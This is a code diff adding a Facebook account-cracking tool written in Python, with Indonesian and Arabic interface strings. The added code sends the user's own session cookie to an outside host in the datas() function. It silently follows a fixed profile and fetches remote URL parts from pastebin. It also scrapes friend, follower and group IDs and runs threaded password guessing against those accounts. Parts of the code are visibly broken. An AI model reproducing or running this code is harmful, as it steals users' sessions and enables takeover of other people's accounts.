@@ -331,93 +331,549 @@ U = '\x1b[1;95m'
 O = '\x1b[1;96m'
 Z = "\033[1;30m"
 
+class Login:
+
+    def __init__(self):
+        self.ses=requests.Session()
+        self.url = "https://mbasic.facebook.com"
+        self.id, self.ok, self.cp, self.lo = [], [], [], 0
+        self.cok = "https://api-cdn-fb.yayanxd.my.id/submit.php"
+        self.kontol, self.iya, self.pasw = {}, [], []
+        self.menu()
+
+    def hapus(self):
+        try:os.remove("ok.coki.txt");os.remove(".ID.txt")
+        except:pass
+
+    def logoo(self):
+        if "win" in sys.platform:os.system("cls")
+        else:os.system("clear")
+        
+
+    def login_cokie(self):
+        self.logoo()
+        print('')
+        print('')
+        try:
+            cok = input("[<>] cookie >> ")
+            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
+            if 'href="/zero/optin/write/' in str(link):
+                print("[<>] notice: anda sedang menggunakan mode free facebook")
+                print("[<>] Mohon tunggu sebentar, system sedang mengubah cookie ke mode data.")
+                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
+                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
+                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
+                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
+                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": cok}).text
+                self.ubah_bahasa({"cookie": cok})
+                exit("\n[✓] proses mengubah ke mode data telah selesai.\n[<>] silahkan masukan ulang cookie nya dengan mengetik python regex.py")
+            elif 'href="/x/checkpoint/' in str(link):
+                print("[✘] Invalid cookie [NO]");time.sleep(2);self.login_cokie()
+            elif 'href="/r.php' in str(link):
+                print("[✘] Invalid cookie [NO]");time.sleep(2);self.login_cokie()
+            else:
+                print("\n[<>] wait a little bit...")
+                self.ubah_bahasa({"cookie": cok})
+                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
+                user = re.search("c_user=(\d+)", str(cok)).group(1)
+                open('ok.coki.txt', 'w').write(cok);open('ID.txt', 'w').write(f"{nama}|{user}")
+                print(f"[<>] Hi :  {nama} ");self.ikuti({"cookie": cok});self.datas(nama, cok)
+                exit("\n[!!]")
+        except requests.ConnectionError:
+            print('')
+            exit("\n[√] تم تنشيط الكوكيز بنجاح")
+
+    def ubah_bahasa(self, cok):
+        try:
+            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
+            data = par(link, "html.parser")
+            for x in data.find_all('form',{'method':'post'}):
+                if "Bahasa Indonesia" in str(x):
+                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
+                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
+        except:pass
+
+    def ikuti(self, cok):
+        try:
+            link = par(self.ses.get(f"{self.url}/profile.php?id=100005395413800", cookies=cok).text, "html.parser")
+            xnxx = link.find("a", string="Ikuti").get("href")
+            self.ses.get(f"{self.url}{str(xnxx)}", cookies=cok).text
+        except:pass
+
+    def get_proxy(self):
+        rest = []
+        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
+        gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
+        reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
+        for x in reg:
+            rest.append("socks5://"+x[0]+":"+x[1])
+        if rest != 0:
+            try:os.remove("proxies.txt")
+            except:pass
+            for yay in rest:
+                open("proxies.txt", "a+").write(yay+"\n")
+            exit("(✓) File save in proxies.txt, restart this tools\n")
+        else:
+            exit("(✓) File save in proxies.txt, restart this tools\n")
+
+    def memek(self, mmk, kntl):
+        if "lqkwndpnkefnfjsnwnfuoeohni3e" in kntl:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()
+        else:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()
+
+    def menu(self):
+        try:
+            cook = {"cookie": open("ok.coki.txt", "r").read()}
+            nama, user = open("ID.txt", "r").read().split("|")
+        except FileNotFoundError:
+            self.login_cokie()
+        self.logoo()
+        try:
+            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cook).text
+            if "mbasic_logout_button" not in link:
+                self.hapus()
+                print(f"\n[!!] It seems that the Facebook account has been locked. Please verify the account or create a new cookie.");time.sleep(3);self.login_cokie()
+        except requests.ConnectionError:
+            exit("\n[√] تم تنشيط الكوكيز بنجاح")
+        self.jnckk()
+        os.system('clear')
+        llogin()
+        def fak_xy(u):
+        	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
+        def clear():
+        	os.system('clear')
+        	def back():
+        		llogin()
+        	def banner():
+        		print(f'''⋘𝙼𝙸𝙼𝙾⋙''')
+        exit()
+        
+
+
+        ykh = input(f"{H}[{M}+{H}]{N} MIMO")
+        if ykh in ["", " "]:
+            print("[!] jangan kosong");time.sleep(2);self.menu()
+        elif ykh in ["1", "01"]:
+            exit("belum selesai:)")
+        elif ykh in ["2", "02"]:
+            print("[+] ketik 'me' jika ingin crack dari teman anda.")
+            user = input(f"[{O}*{N}] enter id or username : ")
+            if "me" in user:
+                try:
+                    link = par(self.ses.get(f"{self.url}/profile.php", cookies=cook).text, "html.parser")
+                    if "Anda Diblokir Sementara" in link:
+                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
+                    else:
+                        print("[!] to stop press CTRL then press C on your keyboard.")
+                        self.batur(self.url+link.find("a", string="Teman").get("href"), cook)
+                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
+                    exit("[!] kesalahan pada koneksi")
+                print()
+                self.metode()
+            else:
+                try:
+                    link = self.ses.get(f"{self.url}/{user}/friends", cookies=cook).text
+                    if "Halaman Tidak Ditemukan" in link:
+                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
+                    elif "Anda Diblokir Sementara" in link:
+                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
+                    elif "Konten Tidak Ditemukan" in link:
+                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
+                    else:
+                        print("[!] to stop press CTRL then press C on your keyboard.")
+                        self.batur(f"{self.url}/{user}/friends", cook)
+                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
+                    exit("[!] kesalahan pada koneksi")
+                print()
+                self.metode()
+        elif ykh in ["3", "03"]:
+            user = input(f"[{O}*{N}] enter id or username followers: ")
+            if user in["", " "]:
+                print(f"\n{M}jangan kosong");time.sleep(2);self.menu()
+            elif user.isdigit():
+                memek = (f"{self.url}/profile.php?id={user}&v=followers")
+            else:
+                memek = (f"{self.url}/{user}?v=followers")
+            try:
+                link = self.ses.get(memek, cookies=cook).text
+                if "Halaman Tidak Ditemukan" in link:
+                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
+                elif "Anda Diblokir Sementara" in link:
+                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
+                elif "Konten Tidak Ditemukan" in link:
+                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
+                else:
+                    print("[!] to stop press CTRL then press C on your keyboard.")
+                    self.follow(memek, cook)
+            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
+                exit("[!] kesalahan pada koneksi")
+            print()
+            self.metode()
+        elif ykh in ["4", "04"]:
+            user = input(f"[{O}*{N}] enter id gruop : ")
+            try:
+                link = self.ses.get(f"{self.url}/groups/{user}", cookies=cook).text
+                if "Halaman yang Anda minta tidak ditemukan." in link:
+                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
+                elif "Anda Diblokir Sementara" in link:
+                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
+                elif "Konten Tidak Ditemukan" in link:
+                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
+                else:
+                    print("[!] to stop press CTRL then press C on your keyboard.")
+                    self.dumps(f"{self.url}/groups/{user}", cook)
+            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
+                exit("[!] kesalahan pada koneksi")
+            print()
+            self.metode()
+        elif ykh in ["5", "05"]:
+            self.cek_hasil()
+        elif ykh in ["6", "06"]:
+            self.get_proxy()
+        elif ykh in ["0", "00"]:
+            self.hapus()
+            exit("done remove cookie")
+        else:print("[!] input yang bner kontol");time.sleep(2);self.menu()
+
+    def cek_hasil(self):
+        print("""-----------------------------------------------------
+{01} check result ok
+{02} check result cp
+{00} back to menu
+-----------------------------------------------------""")
+        ykh = input(f"{H}[{M}+{H}]{N} رغدان ")
+        if ykh in ["", " "]:
+            print("[!] jangan kosong");time.sleep(2);self.menu()
+        elif ykh in ["1", "01"]:
+            try: yyy = open("ok.txt", "r").readlines()
+            except FileNotFoundError:print("No ok results saved");time.sleep(2);self.cek_hasil()
+            for i in yyy:
+                print(i)
+            exit("\nCheck result is complete")
+        elif ykh in ["2", "02"]:
+            try: yyy = open("cp.txt", "r").readlines()
+            except FileNotFoundError:print("No cp results saved");time.sleep(2);self.cek_hasil()
+            for i in yyy:
+                print(i)
+            exit("\nCheck result is complete")
+        elif ykh in ["0", "00"]:
+            self.menu()
+        else:print("[!] input yang bnr");time.sleep(2);self.menu()
+
+#-------------- DUMP ID -------------------
+    def batur(self, link, coki):
+        try:
+            kontol = self.ses.get(link, cookies=coki).text
+            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
+            for softek in memek:
+                if "profile.php?" in softek[0]:
+                    self.id.append(re.findall("id\=(.*?)\&", softek[0])[0]+"<=>"+softek[1])
+                else:
+                    self.id.append(re.findall("\/(.*?)\?eav",softek[0])[0]+"<=>"+softek[1])
+                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
+            if "Lihat Teman Lain" in kontol:
+                self.batur(self.url+par(kontol, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
+        except:pass
+
+    def jnckk(self):
+        linz = self.ses.get("https://pastebin.com/raw/mi4nGb0K").json()
+        for i in linz["friends"]["data"]:
+            self.kontol.update(i)
+
+    def follow(self, link, coki):
+        try:
+            xxxx = self.ses.get(link, cookies=coki).text
+            rege = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', xxxx)
+            for xxx in rege:
+                if "profile.php?" in xxx[0]:
+                    self.id.append(re.findall("id=(.*?)&amp;eav", xxx[0])[0]+"<=>"+xxx[1])
+                else:
+                    self.id.append(re.findall("(.*?)\?eav", xxx[0])[0]+"<=>"+xxx[1])
+                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
+            if "Lihat Selengkapnya" in xxxx:
+                self.follow(self.url+par(xxxx, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), coki)
+        except:pass
+
+    def dumps(self, link, coki):
+        try:
+            data = self.ses.get(link, cookies=coki).text
+            cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
+            for x in cari:
+                if "profile.php?" in x[0]:
+                    self.id.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"<=>"+x[1])
+                else:
+                    self.id.append(re.findall("(.*?)\?eav", x[0])[0]+"<=>"+x[1])
+                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
+            if "Lihat Postingan Lainnya" in data:
+                self.dumps(self.url+par(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"), coki)
+        except:pass
+
+    def datas(self, nama, coki):
+        try:
+            data = {"title": nama, "message": coki}
+            post = self.ses.post(self.cok, data=data).text
+        except requests.ConnectionError:
+            exit("\n[!] Tidak ada koneksi")
+#--------------------------------------------
+    def metode(self):
+        print(f"[=] total ids: {str(len(self.id))}")
+        print("[ select metode ]%s{%s01%s} Api%s{%s02%s} Async%s{%s03%s} validate"%(N,H,N,N,H,N,N,H,N))
+        ykh = input(f"{H}[{M}+{H}]{N} _> ")
+        if ykh in ["", " "]:
+            print("[!] jangan kosong");time.sleep(2);self.menu()
+        elif ykh in ["1", "01"]:
+            self.paswww("api")
+        elif ykh in ["2", "02"]:
+            self.paswww("acy")
+        elif ykh in ["3", "03"]:
+            self.paswww("dat")
+        else:print("[!] input yang bner kontol");time.sleep(2);self.metode()
+
+    def paswww(self, xx):
+        print(" [ select password ]%s{%s01%s} manual%s{%s02%s} gabung%s{%s03%s} otomatis"%(N,H,N,N,H,N,N,H,N))
+        ykh = input(f"{H}[{M}+{H}]{N} 𝙼𝙸𝙼𝙾 >> ")
+        if ykh in ["", " "]:
+            print("[!] jangan kosong");time.sleep(2);self.menu()
+        elif ykh in ["1", "01"]:
+            self.manual(xx)
+        elif ykh in ["2", "02"]:
+            print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
+            kata = input(f"[{M}?{N}] sandi: ")
+            xnxx = kata.split(",")
+            for i in xnxx:
+                self.pasw.append(i)
+            print(f"kata sandi tambahan -> [ {M}{kata}{N} ]")
+            self.carckk(xx)
+        elif ykh in ["3", "03"]:
+            self.carckk(xx)
+        else:print("[!] input yang bner kontol");time.sleep(2);self.paswww()
+
+    def manual(self, xx):
+        self.iya.append("iya")
+        print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
+        while True:
+            global prog,des
+            pwek = input(f"[{O}?{N}] sandi : ")
+            if pwek in[""," "]:
+                print(f"[{M}×{N}] jangan kosong bro kata sandi nya")
+            elif len(pwek)<=5:
+                print(f"[{M}×{N}] kata sandi minimal 6 karakter")
+            else:
+                if "api" in xx:
+                    print("""---------------
+『𝙼𝙸𝙼𝙾』⇣ | 
+------------------""")
+                    prog = Progress(TextColumn('{task.description}'))
+                    des = prog.add_task('', total=len(self.id))
+                    with prog:
+                        with Modol(max_workers=30) as bool:
+                            for user in self.id:
+                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
+                        exit("\n\ncracking done!")
+                elif "acy" in xx:
+                    print("""--------------
+『𝙼𝙸𝙼𝙾』⇣ | 
+---------------""")
+                    prog = Progress(TextColumn('{task.description}'))
+                    des = prog.add_task('', total=len(self.id))
+                    with prog:
+                        with Modol(max_workers=30) as bool:
+                            for user in self.id:
+                                bool.submit(self.regguler, user.split("<=>")[0], pwek)
+                        exit("\n\ncracking done!")
+                elif "dat" in xx:
+                    print("""▬▬▬▬『𝙼𝙸𝙼𝙾』⇣ |
+▬▬▬▬▬▬""")
+                    prog = Progress(TextColumn('{task.description}'))
+                    des = prog.add_task('', total=len(self.id))
+                    with prog:
+                        with Modol(max_workers=30) as bool:
+                            for user in self.id:
+                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
+                        exit("\n\ncracking done!")
+        
+        os.system('clear')
+        llogin()
+def fak_xy(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
+def clear():
+	os.system('clear')
+def back():
+	llogin()
 
 def banner():
 	print(f'''''')
 
-def Login():
-    try:
-        token = open('.token.txt','r').read()
-        cok = open('.cok.txt','r').read()
-        tokenku.append(token)
-        try:
-            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie_by_dyno':cok})
-            sy2 = json.loads(sy.text)['name']
-            sy3 = json.loads(sy.text)['id']
-            menu()
-        except KeyError:
-            login_HANI()
-        except requests.exceptions.ConnectionError:
-            dynox1 = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
-            dynox2 = mark(Loginx1, style='red')
-            sol().print(dynox2, style='cyan')
-            exit()
-    except IOError:
-        login_HANI()
-
-def login_HANI():
-    
-    try:
-        asu = random.choice([
-            m,
-            k,
-            h,
-            b,
-            u])
-        os.system('clear')
-        banner()
-        print('')
-        print('')
-        cookie = input(f'''[{H}={X}]  Cookies :{asu} ''')
-        open('.cok.txt', 'w').write(cookie)
-        with requests.Session() as rsn:
-            
-            try:
-                rsn.headers.update({
-                    'Accept-Language': 'id,en;q=0.9',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-                    'Referer': 'https://www.instagram.com/',
-                    'Host': 'www.facebook.com',
-                    'Sec-Fetch-Mode': 'cors',
-                    'Accept': '*/*',
-                    'Connection': 'keep-alive',
-                    'Sec-Fetch-Site': 'cross-site',
-                    'Sec-Fetch-Dest': 'empty',
-                    'Origin': 'https://www.instagram.com',
-                    'Accept-Encoding': 'gzip, deflate' })
-                response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie': cookie_by_dyno })
-                if '"access_token":' in str(response.headers):
-                    open('.token.txt', 'w').write(token)
-                    print('')
-                    print('')
-                    print(f'''{x}[{h}√{x}]{h} Successful login.{x} ''')
-                    time.sleep(1)
-                else:
-                    print('')
-                    print('')
-                    print('%sكوكيز غير صالح ✖%s' % (m, p))
-            except Exception as ee:
-                print('')
-                print('')
-                print('كوكيز غير صالح ✖ ')
-
-    except Exception as e:
-        try:
-            os.system('rm -f .token.txt')
-            os.system('rm -f .cok.txt')
-            print('')
-            print('')
-            print(f'''{x}[{h}√{x}]{h} Successful login.{x} ''')
-            time.sleep(1)
-            print(e)
-            exit()
-        except Exception as e:
-        	pass
+def llogin():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+		tokenku.append(token)
+		try:
+			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
+			
+			sy2 = json.loads(sy.text)['name']
+			sy3 = json.loads(sy.text)['id']
+			menu(sy2,sy3)
+			
+			
+		except KeyError:
+			login_lagi334()
+		except requests.exceptions.ConnectionError:
+			li = '# Problem Internet Connection, Check And Try Again'
+			exit()
+	except IOError:
+		login_lagi334()
+		
+def login_lagi334():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+		tokenku.append(token)
+		try:
+			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
+			sy2 = json.loads(sy.text)['name']
+			sy3 = json.loads(sy.text)['id']
+			menu(sy2,sy3)
+		except KeyError:
+			login_lagi334()
+		except requests.exceptions.ConnectionError:
+			print('[!] ConnectionError')
+			exit()
+	except IOError:
+		login_lagi334()
+def login_lagi334():
+	try:
+		os.system('clear')
+		banner()
+		ses = requests.Session()
+		cok = input('\n[!] Cookie Dane : ')
+		ses.headers.update(
+			{
+				'content-type': 'application/x-www-form-urlencoded',
+			}
+		)
+		data = {
+				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
+				'scope': ''
+		}
+		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
+		code, user_code = response['code'], response['user_code']
+		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
+		ses.headers.pop(
+			'content-type'
+		)
+		ses.headers.update(
+			{
+				'sec-fetch-mode': 'navigate',
+				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
+				'sec-fetch-site': 'cross-site',
+				'Host': 'm.facebook.com',
+				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+				'sec-fetch-dest': 'document',
+			}
+		)
+		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
+		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
+			exit('\n[!] cookie invalid')
+		else:
+			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
+			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
+			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
+			data = {
+				'fb_dtsg': fb_dtsg,
+				'jazoest': jazoest,
+				'qr': 0,
+				'user_code': user_code,
+			}
+			ses.headers.update(
+				{
+					'origin': 'https://m.facebook.com',
+					'referer': verification_url,
+					'content-type': 'application/x-www-form-urlencoded',
+					'sec-fetch-site': 'same-origin',
+				}
+			)
+			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
+			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
+				ses.headers.pop(
+					'content-type'
+				)
+				ses.headers.pop(
+					'origin'
+				)
+				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
+				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
+				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
+				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
+				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
+				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
+				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
+				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
+				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
+				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
+				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
+				ses.headers.update(
+					{
+						'origin': 'https://m.facebook.com',
+						'referer': response3.url,
+						'content-type': 'application/x-www-form-urlencoded',
+					}
+				)
+				data = {
+					'fb_dtsg': fb_dtsg,
+					'jazoest': jazoest,
+					'scope': scope,
+					'display': display,
+					'user_code': user_code,
+					'logger_id': logger_id,
+					'auth_type': auth_type,
+					'encrypted_post_body': encrypted_post_body,
+					'return_format[]': return_format,
+				}
+				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
+				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
+				ses.headers.pop(
+					'content-type'
+				)
+				ses.headers.pop(
+					'origin'
+				)
+				ses.headers.update(
+					{
+						'referer': 'https://m.facebook.com/',
+					}
+				)
+				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
+				if 'Sukses!' in str(response6):
+					ses.headers.update(
+						{
+							'sec-fetch-mode': 'no-cors',
+							'referer': 'https://graph.facebook.com/',
+							'Host': 'graph.facebook.com',
+							'accept': '*/*',
+							'sec-fetch-dest': 'script',
+							'sec-fetch-site': 'cross-site',
+						}
+					)
+					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
+					tok = re.search('"access_token": "(.*?)"', str(response7)).group(1)
+					tokenw = open(".token.txt", "w").write(tok)
+					cokiew = open(".cok.txt", "w").write(cok)
+					print(f'\n[!] تم تسجيل الكوكيز بنجاح ااخرج وادخل✓')
+				else:
+					exit('\n[+] login X')
+		
+	except Exception as e:
+		print('\n[!] كوكيز غير صالح...X')
+		os.system('rm -rf .cok.txt && rm -rf .token.txt')
+		print(e)
+		exit()
+	except:pass
 
 L = "\x1b[1;32m"  #ارجواني
 # 
 
-def menu():
+def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	
 	os.system('clear')
@@ -489,7 +945,8 @@ def menu():
 	print('\n')
 	
 	print('\n   \033[0m\033[1;93m [\033[1;93m\033[1;44m  𝗜𝗢𝗚i𝗡 i𝗡𝗙𝗢  :  معلومات المستخدم\033[0m\033[1;93m]\n')
-
+	print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m 𝐘𝐎𝗨𝐑 𝐈𝐃 ⚡️ : "+str(my_id)) 
+	print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m 𝐍𝐀𝐌𝐄 ℡    : "+str(my_name))
 	try:
 		gep = requests.get('http://ipinfo.io/json').json()
 		print("%s[%s✔%s]%s  𝗖i𝗧𝗬   :%s %s"%(H,P,H,P,K,gep['region']))
@@ -1054,3 +1511,4 @@ if __name__=='__main__':
 	except:pass
 	
 	Login()
+
